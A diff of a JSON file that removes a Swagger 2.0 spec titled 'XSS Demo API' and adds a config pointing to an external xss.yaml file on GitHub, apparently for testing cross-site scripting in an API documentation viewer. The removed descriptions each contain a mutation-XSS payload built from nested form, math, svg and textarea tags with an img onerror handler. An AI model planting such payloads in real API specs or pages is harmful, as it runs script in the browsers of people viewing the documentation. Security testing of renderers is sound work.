@@ -1,30 +1,10 @@
 {
-  "swagger": "2.0",
-  "info": {
-    "title": "XSS Demo API",
-    "version": "1.0",
-    "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>"
-  },
-  "paths": {
-    "/example": {
-      "get": {
-        "summary": "Example endpoint",
-        "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>",
-        "responses": {
-          "200": {
-            "description": "Success",
-            "schema": {
-              "type": "object",
-              "properties": {
-                "message": {
-                  "type": "string",
-                  "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>"
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
+    "url": "https://github.com/thinhnallf/repo/blob/main/xss.yaml",
+    "urls": [{
+        "url": "https://github.com/thinhnallf/repo/blob/main/xss.yaml",
+        "name": "Foo"
+    },{
+        "url": "https://github.com/thinhnallf/repo/blob/main/xss.yaml",
+        "name": "Foo2"
+    }]
 }
